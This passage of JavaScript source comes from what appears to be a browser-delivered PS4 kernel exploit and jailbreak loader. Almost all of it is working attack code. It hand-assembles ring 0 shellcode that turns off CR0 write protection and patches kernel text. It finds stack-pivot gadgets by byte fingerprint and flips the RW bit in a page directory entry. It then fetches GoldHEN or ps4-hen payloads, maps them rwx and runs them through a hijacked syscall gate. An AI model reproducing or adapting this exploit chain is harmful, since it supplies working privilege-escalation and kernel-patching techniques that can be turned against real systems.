     one of them can fetch a half written instruction. */
  r.apply = function (base, list) {
    const c = this.begin();
    c.hex("48b9").qw(base);
    c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      if (bytes.length === 1) c.hex("c681");
      else if (bytes.length === 2) c.hex("66c781");
      else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.read = function (at, len) {
    len = len || 8;
    if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
    return rdbuf(plus(this.at, STAGE), len);
  };

  r.read_v = function (at) {
    const s = this.read(at, 8);
    if (!s) return null;
    let lo = 0, hi = 0;
    for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
    for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
    return v(lo, hi);
  };

  r.write = function (at, bytes) {
    wrbuf(plus(this.at, STAGE), bytes);
    return this.copy(at, plus(this.at, STAGE), bytes.length, true);
  };

  r.write_v = function (at, q) {
    const b = new Uint8Array(8);
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
    for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
    return this.write(at, b);
  };

  return r;
}

/* ------------------------------------------------------ the host's state */

function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

/* dynlib_get_info fills in the name here and nothing else -- no segment
   array, so no base -- and the mappings carry no path either. So identity
   comes from content: fifteen byte patterns at fixed offsets inside this
   module, which is a stronger fingerprint than a name would be. The map
   supplies the bounds, so every read lands inside a mapping that exists,
   and only mappings long enough to hold the whole span are touched.

   The listing is kept afterwards. The kernel walks its vm_map entries in
   address order and so does this one, so an index here is the same index
   there -- and the chain that walks the kernel side has to be told how far
   to go. Four times further than necessary is four times the ring 0 work
   on a hijacked stack. */
let MAPS = null;

function findLibByShape() {
  const r = { base: null, entries: 0, big: 0, first: [], note: null };
  MAPS = [];
  const pid = sc(S.getpid).i32;
  const mib = alloc(16);
  mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
  mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
  const len = alloc(8);
  len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
  let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
  let need = len.dv.getUint32(0, true);
  if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
  const buf = alloc(need + 0x8000);
  len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
  rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
  const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
  if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

  const span = HOST.last;                     /* everything we ever touch */
  const cand = [];
  let off = 0;
  while (off + 8 <= used) {
    const size = buf.dv.getInt32(off, true);
    if (size <= 0 || off + size > used) break;
    r.entries++;
    const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
    MAPS.push([start, stop]);
    if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
    const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
    if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
      cand.push(start); r.big++;
    }
    off += size;
  }

  /* two patterns, far apart, is already beyond coincidence */
  const probes = [GADGETS.pivot, GADGETS.memcpy];
  for (let i = 0; i < cand.length; i++) {
    let all = true;
    for (let k = 0; k < probes.length && all; k++) {
      const want = unhex(probes[k][1]);
      if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
    }
    if (all) { r.base = cand[i]; return r; }
  }
  r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
  return r;
}

/* Reports instead of returning a bare value: when this comes back empty the
   caller has to know whether the listing failed, the module was absent, or it
   was there with a zero base -- those need different answers, and a zero
   int64 is truthy, which is how a zero base once reached a read as a bare
   gadget offset. */
function findLib(name) {
  const r = { base: null, rv: null, count: 0, seen: [], note: null };
  const list = alloc(4 * 0x300), count = alloc(8);
  count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
  r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
  r.count = count.dv.getUint32(0, true);
  if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
  if (!r.count) { r.note = "the module list came back empty"; return r; }

  const info = alloc(0x160);
  for (let i = 0; i < r.count; i++) {
    info.u8.fill(0);
    info.dv.setUint32(0, 0x160, true);
    const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
    if (rv !== 0) continue;
    let nm = "";
    for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
    if (r.seen.length < 6) r.seen.push(nm);
    if (nm === name) {
      let b = qAt(info, 0x108);
      if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
      /* The segment array does not sit where it does in a game process. Let
         the struct say where it is instead of guessing: a module base is a
         userland address on the 16 KiB grid, and there are very few of those
         in 0x160 bytes. */
      const cand = [];
      for (let o = 8; o + 8 <= 0x160; o += 8) {
        const q = qAt(info, o);
        if (isZero(q)) continue;
        if (q.hi > 0x40) continue;
        if ((q.low & 0x3fff) !== 0) continue;
        cand.push("+0x" + o.toString(16) + "=" + text(q));
        if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
      }
      r.note = cand.length
        ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
        : "found " + name + " but no plausible base anywhere in the info struct";
      return r;
    }
  }
  r.note = name + " is not among the " + r.count + " modules";
  return r;
}

/* Which core we may run on is not ours to choose: this process is confined
   to a subset, and in a browser that subset does not contain core 0. Setting
   bit 0 regardless fails, the thread stays free to migrate, and then the free
   and the refill land in different per cpu buckets -- the hole is filled by
   somebody else and the pivot takes its stack pointer from a stranger. So ask
   first, then pin to the lowest core actually allowed. */
function pinCore() {
  const mask = alloc(16);
  mask.u8.fill(0);
  let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
  if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

  let core = -1, allowed = [];
  for (let b = 0; b < 128; b++) {
    if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
  }
  if (core < 0) return { ok: false, note: "no core in the mask" };

  mask.u8.fill(0);
  mask.u8[core >> 3] = 1 << (core & 7);
  rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
}

/* ------------------------------------------------------- the payload */

/* Fetch a file once. Both loaders are handed the bytes, so deciding the
   format does not cost a second request. */
async function fetchBytes(url, tag) {
  try {
    const r = await fetch(url);
    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
    return new Uint8Array(await r.arrayBuffer());
  } catch (e) {
    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
    return null;
  }
}

/* The kernel patch set. It belongs to GOLDHEN, not to the composite
   image: the blob writes 57 kernel text sites, of which afterglow covers 25 --
   fifteen from PATCHES and ten more from BOOTSTRAP. The remaining 32 are
   exactly what GoldHEN's own code expects to find: a block of 29 from
   0x125791 to 0x125871, plus 0x2fcb5c, 0x391fc6 and 0x3be3c0.

   It runs for both image forms. A raw payload that started without it brought
   GoldHEN up (FTP answered) but left it running without its patches. */
async function runPatchSet(room) {
  const c = host();
  /* REFUSED, not skipped. This used to return true on 14.02 and let the run
     continue, which was wrong: the patch set is not optional scenery. Every
     write in it is a fixed 14.00 address, and on 14.02 those addresses hold
     other functions. A corrected set does not exist for 14.02 -- the sites
     were never re-derived, and eight of the plain `eb` writes are not even
     branch displacements in this kernel. Leaving the set out and loading the
     image anyway only moves the damage into GoldHEN's own step table, which
     is also a list of 14.00 RVAs. So: stop here, before the fetch. */
  if (FW_KEY === "14.02") {
    say("[g] GoldHEN is refused on 14.02 -- nothing of it is loaded or run.");
    say("[g] Its image is 14.00's: the patch set writes 14.00 kernel addresses");
    say("[g] and the step table is a list of 14.00 RVAs. On this kernel those");
    say("[g] are different functions, so it would patch the wrong code.");
    say("[g] On 14.02 the supported payload is ps4-hen, not GoldHEN.");
    say("[g] 14.02 kernel support upstream: " + UPSTREAM_1402);
    return false;
  }
  let pset = null;
  try {
    /* One set per firmware. The blob writes fixed kernel addresses -- 57 of
       them on 14.00 -- so the wrong one does not merely fail, it writes into
       a kernel that has those addresses somewhere else. */
    const r2 = await fetch("patchset-" + FW_KEY.replace(".", "") + ".bin");
    if (r2.ok) pset = new Uint8Array(await r2.arrayBuffer());
  } catch (e) {}
  if (!pset || !pset.length) {
    say("[g] no patch set for firmware " + FW_KEY
        + " -- GoldHEN will not be started without it");
    return false;
  }
  if (pset.length > 0x400 - 0xc0) {
    say("[g] the patch set does not fit in the body area");
    return false;
  }
  wrbuf(plus(room, 0xc0), pset);
  const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
  say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
      + ((pr && pr.lo >>> 0) || 0).toString(16));
  return true;
}

/* Which loader runs is decided by the CONTENT, not by the file name. There
   are two forms and they look alike from outside:
     - composite image: stub area plus payload at 0x50000, exactly
       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
       padding RW.
     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
       started as a thread.
   A GoldHEN build of 297,496 bytes is the second form; going by its name it
   would have taken the composite path and been rejected by the length
   check. */
async function loadEnabler(url, k, kbase, room) {
  /* First thing, before the fetch and before any mapping. The composite path
     builds a trampoline and asks ring 0 to run it; an image that is going to
     be refused must not get that far. runPatchSet refuses too -- this is the
     cheaper gate, not the only one. */
  if (FW_KEY === "14.02") {
    say("[g] GoldHEN has no 14.02 image -- refused before the fetch");
    say("[g] On 14.02 the supported payload is ps4-hen.");
    say("[g] 14.02 kernel support upstream: " + UPSTREAM_1402);
    return false;
  }
  const blob = await fetchBytes(url, "e");
  if (blob === null) return false;
  if (blob.length === GH.nlOff + GH.nlLen) {
    say("[e] " + blob.length + " bytes -- composite image, patch chain path");
    return loadGoldhen(url, k, kbase, room, blob);
  }
  if (blob.length && blob[0] === 0xe9) {
    say("[e] " + blob.length + " bytes, leading jmp -- raw payload path");
    // Here too: GoldHEN expects to find its patches in place.
    if (!(await runPatchSet(room))) return false;
    return loadPayload(url, blob);
  }
  say("[e] " + blob.length + " bytes: neither the composite image ("
      + (GH.nlOff + GH.nlLen) + ") nor a raw payload (leading jmp) -- refusing");
  return false;
}

/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
   goes into a page that is executable only because the kernel patch opened
   rwx, and it runs on its own thread so this one stays free. pthread_create
   is taken out of WebKit's import table and checked against libkernel before
   it is called -- a wrong pointer here runs the payload nowhere.

   Must come after the handles are defused: the enabler can restart SceShellUI,
   and if this process is torn down with the handles still live, that is the
   hang. */
async function loadPayload(url, preloaded) {
  const c = host();
  let blob = preloaded || null;
  if (blob === null) {
    blob = await fetchBytes(url, "p");
    if (blob === null) return false;
  }

  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
  if (blob[0] !== 0xe9) {
    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
    return false;
  }

  const size = (blob.length + 0x3fff) & ~0x3fff;
  const m = sc(S.mmap, 0, size, 7, 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap rwx failed, errno " + c.errno()); return false;
  }

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }

  /* The table blanks both pthread_create fields for 14.00, but only one of
     them deserved it: the import slot is an offset into WebKit, and 14.00
     ships the same WebKit build as 13.52, so that slot did not move.
     k_pthread_create is a libkernel offset and libkernel did move. The
     second was only ever used to check the first, so check it against
     libkernel's own bounds instead -- a slot that resolves into libkernel
     is the right slot, whatever the table says. */
  const SLOT_SHARED_WK = 0x3cb9c00;
  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
    ? c.off.wk___imp_pthread_create : SLOT_SHARED_WK;
  if (!c.webkitBase || !c.libkernelBase) {
    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
    return false;
  }
  const fnr = c.p.read8(c.webkitBase.add32(slot));
  const fn = v(fnr.low, fnr.hi);
  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
    return false;
  }
  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));

  const thr = alloc(8);
  thr.u8.fill(0);
  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
  const handle = qAt(thr, 0);
  const started = rc === 0 && (handle.hi >>> 0) > 0;
  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
      + (started ? " -- running" : " -- did NOT start"));
  return started;
}

/* ------------------------------------------------------- GoldHEN */

/* This image is not a payload in the sense hen.bin is. The first 0x50000
   bytes are a stub area -- a gate at 0x47c00, a trampoline at 0x47c40, a
   marker pair at 0x47e80 -- and the GoldHEN payload proper sits at 0x50000
   and is 636760 bytes, which together is exactly the file's length. The
   payload is not run in userland at all: it is copied into the kernel's text
   padding and main's chain is then driven one call at a time through
   syscall 11, so that a call which does not come back can be named instead
   of guessed. The step order is the Lua implementation's.

   The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
   not executable throughout -- measured, one page in eighteen -- and a ring 0
   jump into a page without the bit is a panic without a signal. A fresh
   mapping is executable throughout once the kernel patch is in. */
const GH = {
  tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
  nlOff: 0x50000, nlLen: 636760,
  rvaPad: 0xb3c000, rvaKmem: 0x466540,
};

const GH_STEPS = [
  [0x12f35, "detect firmware, fill the pointer table"],
  [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
  [0x5cc6,  "save the original pointer from [0x9b8c0]"],
  [0x945,   "kernel patches A"],
  [0xf92,   "kernel patches B"],
  [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
  [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
  [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
  [0x32c4,  "inject klog      -> 3232"],
  [0x325a,  "inject FTP       -> 2121"],
  [0x328f,  "inject BinLoader -> 9090"],
  [0x31af,  "inject mono ELF  -> SceShellUI"],
  [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
  [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
];

/* The payload's BSS lives in the kernel's RX text padding, and it writes
   into it 83 times without bracketing. During main's chain those writes get
   through because every step is wrapped in wp_off/wp_on; GoldHEN's later
   syscall hooks run with CR0.WP=1 and fall over -- a delayed death, far
   enough from its cause to be misread. One RW bit in the page directory
   entry that covers the padding fixes it. It does not survive a reboot.

   The Lua version drives every read through GoldHEN's own trampoline because
   that is its only way into ring 0. We already hold afterglow's gate, so this
   is plain reads and one write.

   Three cross-checks before anything is written: a guessed read of a kernel
   address is a cold start. */
const PT = {
  g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
  padFrom: 0xb3c000, padTo: 0xbe35d8,
};

function paddingRW(k, kbase) {
  const rd = function (a2) { return k.read_v(a2); };
  const kat = function (rva) { return plus(kbase, rva); };

  const g1 = rd(kat(PT.g1)), g2 = rd(kat(PT.g2));
  if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); return false; }
  /* DMAP = 0xffff800000000000 | (g1 << 39) | (g2 << 30) */
  const a1 = g1.low >>> 0, a2v = g2.low >>> 0;
  const dmap = v(((a2v & 3) * 0x40000000) >>> 0,
                 (0xffff8000 | ((a1 << 7) >>> 0) | (a2v >>> 2)) >>> 0);

  const kph = rd(kat(PT.kphys));
  if (!kph) { say("[rw] KPML4phys not readable"); return false; }
  /* the page directory root, as a kernel address through the direct map */
  const p4 = v((dmap.low + kph.low) >>> 0,
               (dmap.hi + kph.hi + (((dmap.low >>> 0) + (kph.low >>> 0) > 0xffffffff) ? 1 : 0)) >>> 0);

  const pm = rd(kat(PT.pmpml4));
  if (!pm || !same(pm, p4)) {
    say("[rw] kernel_pmap->pm_pml4 is " + (pm ? text(pm) : "unreadable")
        + ", the calculation says " + text(p4) + " -- nothing written");
    return false;
  }
  say("[rw] dmap " + text(dmap) + ", pml4 " + text(p4) + " confirmed against kernel_pmap");

  /* one entry per level, by index out of the virtual address */
  const target = kat(PT.padFrom);
  const i4 = (target.hi >>> 7) & 511;
  const i3 = (((target.low >>> 30) & 3) | ((target.hi & 127) << 2)) & 511;
  const i2 = (target.low >>> 21) & 511;

  const viaDmap = function (ent) {               /* entry -> next table, mapped */
    const pl = (ent.low & 0xfffff000) >>> 0, ph = (ent.hi & 0x000fffff) >>> 0;
    return v((dmap.low + pl) >>> 0,
             (dmap.hi + ph + (((dmap.low >>> 0) + pl > 0xffffffff) ? 1 : 0)) >>> 0);
  };

  const e4 = rd(plus(p4, i4 * 8));
  if (!e4 || (e4.low & 1) === 0) { say("[rw] pml4 entry " + i4 + " not present"); return false; }
  const e3at = plus(viaDmap(e4), i3 * 8);
  const e3 = rd(e3at);
  if (!e3 || (e3.low & 1) === 0) { say("[rw] pdp entry " + i3 + " not present"); return false; }
  if ((e3.low & 0x80) !== 0) { say("[rw] the pdp entry is a 1 GiB page -- not handled"); return false; }
  const e2at = plus(viaDmap(e3), i2 * 8);
  const e2 = rd(e2at);
  if (!e2 || (e2.low & 1) === 0) { say("[rw] pd entry " + i2 + " not present"); return false; }

  const big = (e2.low & 0x80) !== 0;
  if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); return false; }
  /* both ends of the padding have to sit inside this one 2 MiB page */
  if (((PT.padFrom >>> 21) !== (PT.padTo >>> 21))) {
    say("[rw] the padding crosses a 2 MiB boundary -- one entry is not enough");
    return false;
  }
  if ((e2.low & 2) !== 0) { say("[rw] the padding already carries RW"); return true; }

  if (!k.write_v(e2at, v((e2.low | 2) >>> 0, e2.hi))) {
    say("[rw] the page directory entry is not writable"); return false;
  }
  const back = rd(e2at);
  if (!back || (back.low & 2) === 0) { say("[rw] the RW bit did not stick"); return false; }
  say("[rw] RW set on the pd entry at " + text(e2at) + " -- the padding is writable");
  return true;
}

async function loadGoldhen(url, k, kbase, room, preloaded) {
  const c = host();
  let blob = preloaded || null;
  if (blob === null) {
    blob = await fetchBytes(url, "g");
    if (blob === null) return false;
  }

  if (blob.length !== GH.nlOff + GH.nlLen) {
    say("[g] " + blob.length + " bytes, expected " + (GH.nlOff + GH.nlLen)
        + " -- this is not the image this recipe describes");
    return false;
  }

  const size = (blob.length + 0x4fff) & ~0xfff;
  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
  const buf = v(m.lo, m.hi);
  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[g] mmap failed, errno " + c.errno()); return false; }
  /* touch every page: the kernel writes in here, and a lazily mapped page
     would fault in ring 0 */
  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
  }
  /* Only the trampoline page is ever entered from this mapping. Executability
     here is per page, and that is measured, not assumed: page 0x47000 carries
     ring 0 code, page 0 does not -- a three byte probe there took the console
     down. So the gate stub and the trampoline live at 0x47c00/0x47c40
     and nothing else from this image is ever jumped to. */
  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  /* Before ring 0 is sent in there, ask from ring 3. Touching a page with a
     write gives it RW and no X; an instruction fetch needs another fault to
     add it, and that fault taken in ring 0 on a userland page is the
     documented death. A plain `ret` entered with callAddr runs in ring 3
     instead: if the page carries no X the WebProcess dies and the console
     does not. Same question, a page instead of a console. */
  codeAt(buf, GH.tram + 0x200).hex("c3");
  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
  if (r3 === undefined || r3 === null) {
    say("[g] the trampoline page does not execute even in ring 3 -- stopping");
    return false;
  }
  say("[g] trampoline page executes in ring 3, so ring 0 may follow");

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
  }
  say("[g] " + blob.length + " bytes at " + text(buf));

  /* the userland side of the gate, exactly as the ring 0 work uses it */
  const gate = codeAt(buf, GH.tor);
  gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");


  let t = null;
  const tram = { n: 0 };
  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
  const fire  = function () {
    const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]);
    return r.lo >>> 0;
  };
  const markClear = function (s2) {
    wr4(plus(buf, GH.mark + s2 * 8), 0xDEADBEEF);
    wr4(plus(buf, GH.mark + s2 * 8 + 4), 0xDEADBEEF);
  };
  const markRead = function (s2) {
    return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
  };

  /* GoldHEN's own patch set, which is not afterglow's -- runPatchSet above
     says what the difference is. The blob is position independent, takes no
     arguments, fetches the kernel base through rdmsr and ends in ret, so it
     only has to sit somewhere ring 0 may run from.

     Not in this mapping. It goes in the libc text tail at rva 0x130730 --
     the same room afterglow runs its own ring 0 bodies from, and the only
     region here proven executable in ring 0 by every call made so far. The
     three byte test above proved the page at +0x47000 and nothing about any
     other; executability is per page, measured at one page in eighteen. The
     set fits in the body area, +0xc0 to +0x400, and afterglow rebuilds that
     body on its next use. */
  if (!(await runPatchSet(room))) return false;

  /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
     kernel base and leave it at +0x47b20, which step 4 then reads back -- we
     have had that base since [1] and it was checked against the gate at [7],
     so the two calls buy nothing.

     Skipping them is also what keeps this safe. They sit at image offset
     0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
     a page every call so far has already run from. Executability here is per
     page -- measured at one page in eighteen on an allocator buffer -- and
     the three byte test proves only the page it ran on. With
     these two gone, the only code entered from this mapping is the
     trampoline, and everything else runs from the kernel's own padding. */
  const kb = kbase;
  t = plus(kb, GH.rvaPad);
  wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
  say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));

  /* before a single byte of GoldHEN goes into the padding */
  if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }

  /* the payload goes into the kernel's padding, not into a thread */
  tram.n = 0;
  wpOff();
  hex("48be"); q64(plus(buf, GH.nlOff));
  hex("48bf"); q64(t);
  hex("b9"); i32(GH.nlLen);
  hex("fc"); hex("f3a4");
  wpOn();
  hex("b8"); i32(0x5758); hex("c3");
  const cp = fire();
  if (cp !== 0x5758) { say("[g] copy into the padding returned 0x" + cp.toString(16)); return false; }
  say("[g] [3] " + GH.nlLen + " bytes into the padding");

  let good = 0, silent = 0;
  for (let n = 0; n < GH_STEPS.length; n++) {
    const rva = GH_STEPS[n][0], what = GH_STEPS[n][1], o = GH_STEPS[n][2] || {};
    markClear(0);
    tram.n = 0;
    wpOff();
    if (o.rdi !== undefined) { hex("48bf"); q64(plus(t, o.rdi)); }
    if (o.esi !== undefined) { hex("be"); i32(o.esi); }
    hex("31c0");
    if (o.ptr) { hex("48b8"); q64(plus(t, rva)); hex("488b00"); hex("ffd0"); }
    else callAbs(rva);
    hex("4898");
    hex("48b9"); q64(plus(buf, GH.mark));
    hex("488901");
    wpOn(); hex("31c0"); hex("c3");
    fire();
    const mk = markRead(0);
    if (mk[1] === 0xDEADBEEF) {
      say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
      silent++;
    } else {
      let rc = mk[0];
      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
      good++;
      if (rc !== 0) say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc
                        + (rc === 3 ? " (target already injected)" : ""));
    }
  }
  say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
  return silent === 0;
}

/* ------------------------------------------------- defusing the handles */

/* Every attempt leaves device handles and a queue behind. Closing them during
   the run kills the console; leaving them kills it when the process dies,
   because neither teardown finishes -- the device close ends in
   destroy_dev_sched, and closing a queue walks its notes and detaches each
   one from a device that is gone.

   So neither path is taken. Both operation tables are copied into the zero
   filled tail of kernel text, the close entry of each copy is pointed at an
   `xor eax,eax ; ret`, and the handles are rehung onto the copies. The cdevs
   leak until reboot, which is harmless.

   In a browser this is not optional and not something to do later: the page
   can go away at any moment, and that moment is the one that hangs. */
let PADDING = 0;   /* set by setFirmware */
const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */

/* The rehang used to be two ring 0 reads and sometimes a write per handle,
   each its own gate entry -- some 660 of them for 220 handles, in a row. The
   same arithmetic as the spray: put the loop in ring 0 and it is one entry.
   The two bodies below were checked against a disassembler before they were
   ever sent, because a wrong jump displacement here is a dead console. */
function rehangRing0(k, room, ofs, list, from, copy) {
  if (!list.length || list.length > 256 || !from) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");                                   /* moved = 0 */
  c.hex("48be").qw(plus(room, STAGE));             /* rsi = the fd list */
  c.hex("48b9").qw(splitNum(list.length));         /* rcx = how many */
  c.hex("49b8").qw(ofs);                           /* r8  = open file array */
  c.hex("49b9").qw(from);                          /* r9  = the table to replace */
  c.hex("49ba").qw(copy);                          /* r10 = our copy */
  c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
  c.hex("4d895308").hex("ffc0").hex("ebda");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function countOffRing0(k, room, ofs, list, copy) {
  if (!list.length || list.length > 256) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
  c.hex("ffc0").hex("ebde");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function teardown(k, kbase, ofs, devs, queues, room) {
  const kat = function (rva) { return plus(kbase, rva); };
  const fileOf = function (fd) { return k.read_v(plus(ofs, fd * 8)); };

  const stub = kat(PADDING + OFF_STUB);
  const dtab = kat(PADDING + OFF_DEVS);
  const qtab = kat(PADDING + OFF_QUEUES);

  say("[t] reading the padding at " + text(stub));
  const there = k.read_v(stub);
  if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
  say("[t] it holds " + text(there));
  if ((there.low >>> 0) === (RET0 >>> 0)) {
    say("[t] the stub is already there from an earlier run");
  } else if (isZero(there)) {
    if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
